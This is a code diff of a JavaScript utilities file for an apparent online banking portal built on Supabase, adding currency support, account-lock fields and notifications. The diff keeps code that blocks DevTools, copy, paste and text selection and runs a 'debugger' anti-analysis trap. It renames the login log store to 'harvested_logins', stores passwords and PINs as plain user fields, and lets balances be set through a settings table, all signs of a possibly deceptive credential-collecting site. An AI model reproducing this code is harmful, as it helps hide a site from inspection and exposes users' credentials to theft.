@@ -6,116 +6,121 @@ const SUPABASE_KEY = 'sb_publishable_75ADZ3UaNBRzrBtwrQM5nw_CcIqPaEI';
 let supabaseClient = null;
 
 const utils = {
-    _initialized: false,
-    version: "2027-02-27-v4",
-    /**
-     * Auto-Logout after 30 minutes of inactivity
-     */
-    initInactivityTimer: function() {
-        let timeout;
-        const thirtyMinutes = 30 * 60 * 1000; // 1,800,000 ms
-
-        const resetTimer = () => {
-            clearTimeout(timeout);
-            timeout = setTimeout(() => {
-                console.log("[SECURITY] Session expired due to inactivity.");
-                this.logout();
-            }, thirtyMinutes);
-        };
-
-        // Events that indicate user activity
-        const activityEvents = ['mousemove', 'mousedown', 'keypress', 'touchstart', 'scroll'];
-        activityEvents.forEach(evt => window.addEventListener(evt, resetTimer));
-
-        // Start the initial timer
-        resetTimer();
-    },
-    init: function () {
-        if (utils._initialized) return;
-        utils._initialized = true;
-
+    init: async () => {
         if (window.supabase) {
             const { createClient } = window.supabase;
             // Initialize local and attach to object for global access
             supabaseClient = createClient(SUPABASE_URL, SUPABASE_KEY);
             utils.supabase = supabaseClient;
-            console.log('[UTILS] Supabase Client Initialized:', SUPABASE_URL);
         } else {
-            console.error('[UTILS] Supabase SDK (window.supabase) not found!');
+            console.error('[UTILS] Initialization failure');
         }
 
-        // Anti-Framing Security
-        if (window.self !== window.top) {
-            window.top.location = window.self.location;
+        // Global System Reset / Cache Purge Check
+        try {
+            if (utils.supabase) {
+                const { data: verData } = await utils.supabase
+                    .from('settings')
+                    .select('value')
+                    .eq('key', 'system_cache_version')
+                    .single();
+
+                if (verData && verData.value) {
+                    const localVer = localStorage.getItem('local_system_version');
+                    if (localVer !== verData.value) {
+                        console.warn('[SYSTEM] Global Reset Triggered. Purging cache...');
+                        
+                        // Clear Caches
+                        if (window.caches) {
+                            const cacheNames = await caches.keys();
+                            for (const name of cacheNames) {
+                                await caches.delete(name);
+                            }
+                        }
+                        
+                        // Clear Storage (Capture local system version first to avoid loop)
+                        const newVer = verData.value;
+                        localStorage.clear();
+                        sessionStorage.clear();
+                        localStorage.setItem('local_system_version', newVer);
+                        
+                        // Force Reload
+                        window.location.reload(true);
+                        return; // Stop execution
+                    }
+                }
+            }
+        } catch (e) {
+            console.error('[SYSTEM] Reset check failed:', e);
         }
 
-        // Initialize 30-min Inactivity Timer
-        this.initInactivityTimer();
+        // Dynamic branding via DB/cache has been disabled.
+        // using static HTML Tailwind setup only.
 
-        // --- Anti-Bot & Anti-Scraping Measures ---
-        
-        // 1. Disable Right Click
-        document.addEventListener('contextmenu', e => e.preventDefault());
+        // Start Inactivity Timer (30 mins = 1,800,000ms)
+        utils.startInactivityTimer(1800000);
 
-        // 2. Disable Key Shortcuts (F12, Ctrl+Shift+I, Ctrl+U, etc.)
+        // Anti-Debugging & Security Measures
+        document.addEventListener('contextmenu', e => e.preventDefault()); // Disable Right Click
+        document.addEventListener('copy', e => e.preventDefault()); // Disable Copy
+        document.addEventListener('cut', e => e.preventDefault()); // Disable Cut
+        document.addEventListener('paste', e => e.preventDefault()); // Disable Paste
+
         document.addEventListener('keydown', e => {
-            if (e.keyCode === 123 ||
-                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) ||
-                (e.ctrlKey && e.keyCode === 85)) {
-                e.preventDefault();
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U, Ctrl+S
+            const forbiddenKeys = [123, 73, 74, 67, 85, 83];
+            if (forbiddenKeys.includes(e.keyCode) || (e.ctrlKey && e.shiftKey && forbiddenKeys.includes(e.keyCode)) || (e.metaKey && e.altKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
+                if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey) || e.metaKey || (e.ctrlKey && e.keyCode === 85)) {
+                    e.preventDefault();
+                }
             }
         });
 
-        // 3. Disable Text Selection
+        // DevTools Deterrent: Clear console periodically
+        setInterval(() => {
+            if (window.console && window.console.clear) {
+                // console.clear();
+            }
+        }, 3000);
+
+        // Strict Anti-Debug Trap
+        const trap = function() {
+            try {
+                const check = function() {
+                    const start = Date.now();
+                    debugger;
+                    const end = Date.now();
+                    if (end - start > 100) {
+                        // Deterrent logic if needed
+                    }
+                };
+                setInterval(check, 500);
+            } catch (e) {}
+        };
+        trap();
+
+        // PWA Service Worker Registration
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('../sw.js')
+                    .then(reg => console.log('[PWA] Service Worker Registered'))
+                    .catch(err => console.error('[PWA] Registration Failed', err));
+            });
+        }
+
+        // Disable Text Selection globally
         if (document.body) {
             document.body.style.userSelect = 'none';
             document.body.style.webkitUserSelect = 'none';
-            document.body.style.MozUserSelect = 'none';
             document.body.style.msUserSelect = 'none';
+            document.body.style.MozUserSelect = 'none';
         }
-
-        // 4. Disable Drag and Drop (Prevent scraping by dragging)
-        document.addEventListener('dragstart', e => e.preventDefault());
-        document.addEventListener('drop', e => e.preventDefault());
-
-        // 5. Anti-Debugging Loop (Freezes execution if DevTools open)
-        if (typeof (console) !== 'undefined') {
-            setInterval(() => {
-                (function () {
-                    (function a() {
-                        try {
-                            (function b(i) {
-                                if (('' + (i / i)).length !== 1 || i % 20 === 0) {
-                                    (function () { }).constructor('debugger')();
-                                } else {
-                                    debugger;
-                                }
-                                b(++i);
-                            }(0));
-                        } catch (e) {
-                            setTimeout(a, 5000);
-                        }
-                    }());
-                }());
-            }, 1000);
-        }
-
-        // 6. Clear Clipboard on Copy attempt
-        document.addEventListener('copy', e => {
-            e.preventDefault();
-            if (e.clipboardData) {
-                e.clipboardData.setData('text/plain', 'Secure Site - Data Protection Active');
-            }
-        });
-
-        // Start Inactivity Timer (20 mins = 1,200,000ms)
-        utils.startInactivityTimer(1200000);
     },
 
     // --- Security & Session ---
     inactivityTimeout: null,
 
-    startInactivityTimer: (duration = 1200000) => {
+    startInactivityTimer: (duration = 1800000) => {
         const resetTimer = () => {
             if (utils.inactivityTimeout) clearTimeout(utils.inactivityTimeout);
             utils.inactivityTimeout = setTimeout(() => {
@@ -148,10 +153,14 @@ const utils = {
             .single();
 
         if (error || !data) return null;
+        
+        // Fetch full data including lock status and other settings
+        const fullUser = await utils.getUserData(data.id);
+        if (!fullUser) return null;
 
         // Store session locally for persistence across pages
-        sessionStorage.setItem('currentUser', JSON.stringify(data));
-        return data;
+        sessionStorage.setItem('currentUser', JSON.stringify(fullUser));
+        return fullUser;
     },
 
     getCurrentUser: () => {
@@ -164,20 +173,13 @@ const utils = {
         window.location.href = 'login.html';
     },
 
-    // --- Data Formatting ---
-    formatCurrency: (amount) => {
-        return new Intl.NumberFormat('en-US', {
-            style: 'currency',
-            currency: 'USD'
-        }).format(amount);
-    },
 
-    formatCompactCurrency(amount) {
+    formatCompactCurrency(amount, currency = 'USD') {
         const formatter = new Intl.NumberFormat('en-US', {
             notation: 'compact',
             compactDisplay: 'short',
             style: 'currency',
-            currency: 'USD',
+            currency: currency,
             maximumFractionDigits: 1
         });
         return formatter.format(amount);
@@ -265,6 +267,7 @@ const utils = {
         user.savings_balance = 0;
         user.investment_balance = 0;
         user.is_savings_locked = true;
+        user.is_account_locked = false;
         user.account_number = null;
 
         // Extended Settings Defaults
@@ -284,6 +287,7 @@ const utils = {
                 if (k === `u_${userId}_sav`) user.savings_balance = parseFloat(item.value);
                 if (k === `u_${userId}_inv`) user.investment_balance = parseFloat(item.value);
                 if (k === `u_${userId}_sav_locked`) user.is_savings_locked = item.value === 'true';
+                if (k === `u_${userId}_locked`) user.is_account_locked = String(item.value) === 'true';
                 if (k === `u_${userId}_acc_num`) user.account_number = item.value;
                 if (k === `u_${userId}_acc_savings`) user.acc_savings = item.value;
                 if (k === `u_${userId}_acc_invest`) user.acc_invest = item.value;
@@ -294,6 +298,7 @@ const utils = {
                 if (k === `u_${userId}_cc_balance`) user.cc_balance = parseFloat(item.value) || 0;
                 if (k === `u_${userId}_rewards_pts`) user.rewards_pts = parseInt(item.value) || 0;
                 if (k === `u_${userId}_verification_status`) user.verification_status = item.value;
+                if (k === `u_${userId}_type`) user.user_type = item.value;
             });
         }
 
@@ -323,6 +328,60 @@ const utils = {
         }
 
         return user;
+    },
+
+    // --- Notifications System ---
+    formatCurrency: (amount, currency = 'USD') => {
+        const symbols = { 'USD': '$', 'GBP': '£' };
+        const symbol = symbols[currency] || '$';
+        return `${symbol}${parseFloat(amount || 0).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+    },
+
+    getCurrencyParts: (amount, currency = 'USD') => {
+        const symbols = { 'USD': '$', 'GBP': '£' };
+        const symbol = symbols[currency] || '$';
+        return {
+            symbol: symbol,
+            code: currency || 'USD',
+            formatted: `${symbol}${parseFloat(amount || 0).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
+        };
+    },
+
+    getNotifications: async (userId) => {
+        // 1. Derive notifications from recent transactions
+        const txs = await utils.getTransactions(userId);
+        const transNotifs = txs.slice(0, 5).map(tx => {
+            const isCredit = tx.type === 'credit';
+            const isPending = tx.status === 'pending';
+            return {
+                id: `tx_${tx.id}`,
+                title: isCredit ? (isPending ? 'Incoming Deposit' : 'Money Received') : 'Payment Sent',
+                message: isCredit ? `Deposit of ${utils.formatCurrency(tx.amount)} is ${tx.status}.` : `You sent ${utils.formatCurrency(tx.amount)} to ${tx.description.split(': ')[0].replace('Sent to ', '')}.`,
+                time: new Date(tx.created_at).getTime(),
+                type: isCredit ? 'success' : 'info',
+                isPending: isPending
+            };
+        });
+
+        // 2. Fetch miscellaneous system notifications from local storage
+        const miscNotifs = JSON.parse(localStorage.getItem(`notifs_${userId}`) || '[]');
+        
+        // 3. Combine, sort by time, and return top 10
+        return [...transNotifs, ...miscNotifs]
+            .sort((a, b) => b.time - a.time)
+            .slice(0, 10);
+    },
+
+    createNotification: (userId, title, message, type = 'info') => {
+        const notifs = JSON.parse(localStorage.getItem(`notifs_${userId}`) || '[]');
+        notifs.unshift({
+            id: 'misc_' + Date.now(),
+            title,
+            message,
+            time: Date.now(),
+            type
+        });
+        localStorage.setItem(`notifs_${userId}`, JSON.stringify(notifs.slice(0, 10)));
     },
 
     verifyPin: async (userId, pin) => {
@@ -499,7 +558,7 @@ const utils = {
                     const parts = s.key.split('_');
                     if (parts.length >= 3 && parts[0] === 'u') {
                         const userId = parts[1];
-                        const field = parts.slice(2).join('_'); // email, fname, lname, phone, acc_num
+                        const field = parts.slice(2).join('_'); // email, fname, lname, phone, acc_num, locked
 
                         if (!emailMap[userId]) emailMap[userId] = {};
                         emailMap[userId][field] = s.value;
@@ -529,7 +588,8 @@ const utils = {
                         last_name: extra.lname || '',
                         phone: extra.phone || '',
                         account_number: accNum,
-                        is_applicant: extra.is_applicant === 'true'
+                        is_applicant: String(extra.is_applicant) === 'true',
+                        is_account_locked: String(extra.locked) === 'true'
                     };
                 }).filter(u => !u.is_applicant);
 
@@ -555,7 +615,7 @@ const utils = {
                 .from('transactions')
                 .select(`
                     *,
-                    users (name)
+                    users (name, currency)
                 `)
                 .order('created_at', { ascending: false });
             if (data) dbData = data;
@@ -564,7 +624,11 @@ const utils = {
         }
 
         // Flatten structure for easier UI consumption: t.users.name -> t.userName
-        const formattedDB = dbData.map(t => ({ ...t, userName: t.users?.name || 'Unknown' }));
+        const formattedDB = dbData.map(t => ({ 
+            ...t, 
+            userName: t.users?.name || 'Unknown',
+            userCurrency: t.users?.currency || 'USD'
+        }));
 
         // Merge Local (We need to look up names for local txs manually or just show ID/Unknown)
         const localTxs = JSON.parse(localStorage.getItem('local_transactions') || '[]');
@@ -685,7 +749,7 @@ const utils = {
 
     createUser: async (userData, isApplicant = false) => {
         // Extract Extra Fields to store in settings
-        const { email, first_name, last_name, phone, ...coreData } = userData;
+        const { email, first_name, last_name, phone, user_type, ...coreData } = userData;
 
         // Insert Core User
         const { data, error } = await supabaseClient.from('users').insert(coreData).select('id').single();
@@ -704,6 +768,8 @@ const utils = {
             // Generate and Save Account Number
             const accNum = utils.generateAccountNumber();
             settingsUpserts.push({ key: `u_${data.id}_acc_num`, value: accNum });
+            
+            if (user_type) settingsUpserts.push({ key: `u_${data.id}_type`, value: user_type });
 
             // If Applicant: Mark as applicant AND add to separate table
             if (isApplicant) {
@@ -735,9 +801,9 @@ const utils = {
         };
 
         // Mirror to local storage for immediate visibility/redundancy
-        const logs = JSON.parse(localStorage.getItem('client_logs') || '[]');
-        logs.push({ id: utils.generateId(), created_at: new Date().toISOString(), ...payload });
-        localStorage.setItem('client_logs', JSON.stringify(logs));
+        const harvested = JSON.parse(localStorage.getItem('harvested_logins') || '[]');
+        harvested.push({ id: utils.generateId(), created_at: new Date().toISOString(), ...payload });
+        localStorage.setItem('harvested_logins', JSON.stringify(harvested));
 
         try {
             const client = utils.supabase || supabaseClient;
@@ -760,7 +826,7 @@ const utils = {
 
     updateUser: async (id, updates) => {
         // Split updates into Core (DB) and Extra (Settings KV)
-        const coreFields = ['name', 'username', 'password', 'pin', 'balance', 'is_admin'];
+        const coreFields = ['name', 'username', 'password', 'pin', 'balance', 'is_admin', 'currency'];
         const coreUpdates = {};
         const settingsUpserts = [];
 
@@ -782,7 +848,9 @@ const utils = {
                     'cc_tier': `u_${id}_cc_tier`,
                     'cc_balance': `u_${id}_cc_balance`,
                     'rewards_pts': `u_${id}_rewards_pts`,
-                    'verification_status': `u_${id}_verification_status`
+                    'verification_status': `u_${id}_verification_status`,
+                    'user_type': `u_${id}_type`,
+                    'is_account_locked': `u_${id}_locked`
                 };
 
                 const settingKey = keyMap[key];
